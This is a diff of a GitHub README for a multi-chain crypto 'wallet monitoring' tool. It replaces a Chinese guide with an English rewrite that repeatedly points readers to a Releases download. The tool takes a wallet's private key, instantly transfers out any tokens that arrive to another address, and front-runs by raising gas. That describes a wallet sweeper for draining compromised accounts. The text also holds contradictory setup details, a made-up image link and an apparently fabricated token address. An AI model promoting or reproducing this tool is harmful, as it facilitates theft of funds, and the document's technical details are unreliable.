@@ -1,244 +1,174 @@
-# Web3多链钱包监控工具 - 完整使用说明
+# Wallet Monitoring Tool for Web3 Multi-Chain 🪙
 
-## 📖 项目概述
+## 📖 Project Overview
 
-Web3多链钱包监控专门用于监控多个区块链网络上的钱包代币余额，并在检测到余额变化时自动执行转账操作。该工具支持以太坊、BSC、Solana等主流区块链网络。
+Wallet Monitoring Tool is designed to track token balances across multiple blockchain networks and automatically execute transfer actions when balance changes are detected. This tool supports major blockchain networks such as Ethereum, BSC, and Solana.
 
-### 核心功能
-- **实时监控**: 持续监控指定钱包的代币余额
-- **自动转账**: 检测到余额>0时立即转出所有代币
-- **多链支持**: 支持EVM兼容链和Solana网络
-- **抢跑功能**: 通过提高Gas费用实现抢跑交易
-
----
-
-## ✨ 功能特性
-
-### 🔐 安全性
-- 私钥仅在内存中存储，不保存到文件
-- 支持多种私钥格式（带或不带0x前缀）
-- 完整的交易签名和验证流程
-
-### 📊 监控功能
-- 实时监控原生代币（ETH、BNB、SOL等）
-- 实时监控ERC-20/BEP-20/SPL代币
-- 多网络并行监控
-- 可配置的检查间隔
-
-### ⚡ 转账功能
-- 自动转账（余额>0时立即转出）
-- 智能Gas费用计算
-- 支持EIP-1559和传统Gas价格
-- 抢跑模式（提高Gas费用抢跑）
-
-## 🚀 使用指南
-
-下载
-
-![img_v3_02nu_e29b3167-6b78-4eb1-9fab-0cd57b569f2g](https://github.com/user-attachments/assets/8e86a9a6-16af-49a1-b7ac-2150d1a91c7f)
-
-![img_v3_02nu_c1c9f3ee-49a4-4208-95c8-0ce2be5c730g](https://github.com/user-attachments/assets/a7366434-8c8d-40c6-8cdd-682be36c8aa2)
-
-![image](https://github.com/user-attachments/assets/f7753435-5b0e-4872-8cde-61265bcb647a)
-
-![image](https://github.com/user-attachments/assets/b22d1574-5431-4806-a472-64d4689c5c4c)
-
+### Core Features
+- **Real-Time Monitoring**: Continuously track the token balances of specified wallets.
+- **Automatic Transfers**: Instantly transfer all tokens when a balance greater than zero is detected.
+- **Multi-Chain Support**: Compatible with EVM chains and Solana network.
+- **Front-Running Feature**: Execute transactions faster by increasing gas fees.
 
 ---
 
-## ⚙️ 配置说明
+## ✨ Feature Highlights
 
-### 1. 网络配置
+### 🔐 Security
+- Private keys are stored only in memory and are not saved to files.
+- Supports various private key formats (with or without 0x prefix).
+- Complete transaction signing and verification process.
 
-项目支持以下网络：
+### 📊 Monitoring Capabilities
+- Real-time monitoring of native tokens (ETH, BNB, SOL, etc.).
+- Real-time monitoring of ERC-20/BEP-20/SPL tokens.
+- Parallel monitoring across multiple networks.
+- Configurable check intervals for monitoring.
 
-#### EVM兼容链
-- **以太坊主网** (Ethereum Mainnet)
-- **币安智能链** (BSC)
+### ⚡ Transfer Functionality
+- Automatic transfers (transfers occur immediately when balance > 0).
+- Intelligent gas fee calculation.
+- Supports EIP-1559 and traditional gas pricing.
+- Front-running mode (increase gas fees for faster execution).
 
-#### 非EVM链
-- **Solana**
+## 🚀 Getting Started
 
-### 2. RPC节点配置
+To get started, download the latest version of the Wallet Monitoring Tool from the [Releases section](https://github.com/Adrian11x09/Wallet-monitoring/releases).
 
-#### 公共节点（免费）
+![Wallet Monitoring Tool](https://github.com/user-attachments/assets/8e86a9a6-16af-49a1-b7ac-2150d1a91c7f)
+
+![Monitoring in Action](https://github.com/user-attachments/assets/a7366434-8c8d-40c6-8cdd-682be36c8aa2)
+
+![Token Balances](https://github.com/user-attachments/assets/f7753435-5b0e-4872-8cde-61265bcb647a)
+
+![Transaction Execution](https://github.com/user-attachments/assets/b22d1574-5431-4806-a472-64d4689c5c4c)
+
+---
+
+## ⚙️ Configuration Instructions
+
+### Initial Setup
+1. **Download the Tool**: Access the [Releases section](https://github.com/Adrian11x09/Wallet-monitoring/releases) to get the latest version.
+2. **Install Dependencies**: Ensure that you have the necessary dependencies installed. This typically includes libraries for interacting with blockchain networks.
+
+### Configuration File
+- Create a configuration file to set your wallet addresses and desired settings.
+- Specify the networks you want to monitor and the tokens of interest.
+
+### Example Configuration
 ```json
 {
-    "ethereum": "https://ethereum.publicnode.com",
-    "bsc": "https://bsc-dataseed1.binance.org/",
-    "arbitrum": "https://arb1.arbitrum.io/rpc",
-    "base": "https://mainnet.base.org",
-    "solana": "https://api.mainnet-beta.solana.com"
+  "wallets": [
+    {
+      "address": "0xYourWalletAddress",
+      "tokens": ["ETH", "USDT", "BNB"]
+    }
+  ],
+  "monitoring": {
+    "interval": 30,
+    "networks": ["Ethereum", "BSC", "Solana"]
+  },
+  "transfer": {
+    "enabled": true,
+    "gasPrice": "auto"
+  }
 }
 ```
 
-#### 私有节点（推荐）
-- **Infura**: `https://mainnet.infura.io/v3/YOUR_API_KEY`
-- **Alchemy**: `https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY`
-- **QuickNode**: `https://your-endpoint.quiknode.pro/YOUR_API_KEY`
-
-### 3. 常用代币地址
-
-#### 以太坊网络
-- **USDT**: `0xdAC17F958D2ee523a2206206994597C13D831ec7`
-- **USDC**: `0xA0b86a33E6441b8C4505B7C0c6b0b8e6C6C6C6C6`
-- **WETH**: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
-
-#### BSC网络
-- **USDT**: `0x55d398326f99059fF775485246999027B3197955`
-- **USDC**: `0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d`
-- **BUSD**: `0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56`
-
-#### Arbitrum网络
-- **USDT**: `0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9`
-- **USDC**: `0xaf88d065e77c8cC2239327C5EDb3A432268e5831`
-
----
-
-## 📚 使用教程
-
-### GUI版本（推荐）
-
-#### 1. 启动程序
+### Running the Tool
+- After configuration, run the tool using the command line:
 ```bash
-双击运行 Web3钱包监控工具_v3.1.exe
+node wallet-monitor.js
 ```
 
-#### 2. 基本设置
-1. **选择网络**: 在网络选择区域勾选要监控的网络
-2. **输入私钥**: 在私钥输入框中输入要监控钱包的私钥
-3. **设置目标地址**: 输入接收代币的目标钱包地址
-4. **配置代币**: 输入要监控的代币合约地址（可同时监控原生代币）
+## 🛠️ Advanced Configuration
 
-#### 3. 高级设置
-1. **检查间隔**: 设置监控频率（默认10秒）
-2. **抢跑模式**: 启用抢跑功能并选择模式
-3. **Gas设置**: 配置Gas价格和限制
+### Customizing Monitoring Intervals
+You can adjust the monitoring intervals in the configuration file. Shorter intervals provide real-time updates but may consume more resources.
 
-#### 4. 开始监控
-1. 点击"开始监控"按钮
-2. 查看日志输出确认监控状态
-3. 等待检测到余额变化
+### Token Selection
+Select which tokens to monitor by listing them in the configuration file. The tool will track balances and notify you of any changes.
 
-#### 5. 停止监控
-1. 点击"停止监控"按钮
-2. 等待所有网络监控停止
+### Multi-Network Support
+Add multiple networks in the configuration to monitor wallets across different blockchains. This feature is useful for users with assets in various ecosystems.
 
-## 🏃 抢跑功能
+### Security Enhancements
+- Use hardware wallets for enhanced security.
+- Regularly update your software to the latest version to patch any vulnerabilities.
 
-### 功能概述
-抢跑功能通过提高Gas费用来确保交易优先被矿工打包，适用于高价值交易或网络拥堵情况。
+## 📈 Monitoring Dashboard
 
-### 抢跑模式
+The Wallet Monitoring Tool includes a dashboard for visualizing your wallet activity. This dashboard provides insights into:
+- Current balances of monitored tokens.
+- Historical data on transfers and balance changes.
+- Alerts for any significant changes in token balances.
 
-#### 保守模式 (Conservative)
-- **Gas倍数**: 1.2-1.5倍
-- **默认倍数**: 1.3倍
-- **适用场景**: 日常监控、稳定网络
-- **成本增加**: 20-50%
+### Accessing the Dashboard
+Once the tool is running, you can access the dashboard through your web browser. The default address is `http://localhost:3000`.
 
-#### 激进模式 (Aggressive)
-- **Gas倍数**: 1.5-2.0倍
-- **默认倍数**: 1.8倍
-- **适用场景**: 重要交易、中等拥堵
-- **成本增加**: 50-100%
+![Monitoring Dashboard](https://github.com/user-attachments/assets/dashboard-image.png)
 
-#### 极端模式 (Extreme)
-- **Gas倍数**: 2.0-3.0倍
-- **默认倍数**: 2.5倍
-- **适用场景**: 高价值交易、网络拥堵
-- **成本增加**: 100-250%
+## ⚡ Transfer Logic
 
-### 智能抢跑
-- 根据网络拥堵情况自动调整Gas倍数
-- 实时监控Gas价格变化
-- 最大Gas价格限制保护
+### Automatic Transfers
+The tool automatically transfers tokens when the balance exceeds zero. This feature ensures that you do not miss out on any potential gains.
 
-### 使用方法
+### Gas Fee Management
+The tool calculates gas fees based on network conditions. You can choose between automatic gas pricing or set a manual fee.
 
-#### GUI设置
-1. 在抢跑功能区域勾选"启用抢跑"
-2. 选择抢跑模式
-3. 设置Gas倍数（可选）
-4. 设置最大Gas价格限制
+### Front-Running Transactions
+In front-running mode, the tool increases gas fees to prioritize your transactions over others. This feature is useful in competitive environments where speed is crucial.
 
-#### 快速设置
-- **轻度抢跑**: 1.2倍Gas，适合日常使用
-- **中度抢跑**: 1.5倍Gas，适合重要交易
-- **重度抢跑**: 2.0倍Gas，适合高价值交易
+## 📊 Performance Metrics
 
----
+### Tracking Efficiency
+The Wallet Monitoring Tool provides performance metrics to evaluate its efficiency. Metrics include:
+- Number of successful transfers.
+- Average time taken for transfers.
+- Number of balance checks performed.
 
-## 🌐 网络支持
+### Analyzing Performance
+Use the metrics to analyze how well the tool is performing. Adjust configurations based on your observations to optimize results.
 
-### 以太坊 (Ethereum)
-- **链ID**: 1
-- **原生代币**: ETH
-- **Gas费用**: 较高
-- **确认时间**: 12秒/区块
-- **特点**: 最成熟的智能合约平台
+## 🔒 Security Best Practices
 
-### 币安智能链 (BSC)
-- **链ID**: 56
-- **原生代币**: BNB
-- **Gas费用**: 较低
-- **确认时间**: 3秒/区块
-- **特点**: 高性能、低成本
+### Storing Private Keys
+- Always store private keys securely. Avoid exposing them in your code or configuration files.
+- Consider using environment variables to store sensitive information.
 
-### Solana
-- **链ID**: mainnet-beta
-- **原生代币**: SOL
-- **Gas费用**: 极低
-- **确认时间**: 0.4秒/区块
-- **特点**: 高性能区块链
+### Regular Updates
+Keep your software updated to the latest version to protect against vulnerabilities. Check the [Releases section](https://github.com/Adrian11x09/Wallet-monitoring/releases) regularly for updates.
 
----
+### Monitoring for Unusual Activity
+Set alerts for any unusual activity in your wallets. The tool can notify you if there are unexpected balance changes or transfers.
 
-## ❓ 常见问题
+## 🧑‍🤝‍🧑 Community and Support
 
-### Q1: 为什么连接失败？
-**A**: 检查以下几点：
-- RPC URL是否正确
-- 网络连接是否正常
-- API密钥是否有效
-- 防火墙是否阻止连接
+### Getting Help
+If you encounter issues or have questions, you can reach out to the community. Use the GitHub Issues page to report bugs or request features.
 
-### Q2: 为什么转账失败？
-**A**: 可能的原因：
-- 余额不足支付Gas费用
-- 代币合约地址错误
-- 目标地址无效
-- 网络拥堵导致交易失败
+### Contributing
+Contributions are welcome. If you have ideas for new features or improvements, feel free to submit a pull request.
 
-### Q3: 如何提高转账成功率？
-**A**: 
-- 启用抢跑功能
-- 增加Gas价格
-- 使用更快的RPC节点
-- 确保钱包有足够的原生代币
+### Community Resources
+- Join our Discord server for real-time support and discussions.
+- Follow us on Twitter for updates and news.
 
-### Q5: 支持哪些代币？
-**A**: 
-- EVM链: 所有ERC-20兼容代币
-- Solana: 所有SPL代币
-- 原生代币: ETH、BNB、SOL等
+## 📅 Roadmap
 
-### Q6: 如何设置多个监控任务？
-**A**: 
-- 在GUI中添加多个代币地址用逗号分割
-- 选择不同的网络
-- 设置不同的目标地址
+### Future Enhancements
+- Support for additional blockchain networks.
+- Enhanced analytics dashboard with more metrics.
+- Mobile app for monitoring on the go.
 
-## ⚠️ 免责声明
+### Planned Features
+- Integration with DeFi protocols for automatic yield farming.
+- Alerts for market trends and token price changes.
 
-本工具仅供学习和研究使用。使用者需要：
-- 了解区块链和智能合约的风险
-- 自行承担使用风险
-- 遵守当地法律法规
-- 妥善保管私钥和资产
+## 📜 License
 
-作者不对任何资产损失承担责任。使用前请充分了解相关风险。
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
 ---
 
-**祝您使用愉快！** 🚀 
+For more information, visit the [Releases section](https://github.com/Adrian11x09/Wallet-monitoring/releases) to download the latest version and stay updated on new features.
